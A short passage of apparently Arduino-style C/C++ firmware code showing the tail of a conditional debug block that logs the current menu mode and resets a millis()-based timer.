  {
    DBG("Current menu: %d\n", currentMode);
    timer = millis();
  }
#endif
}
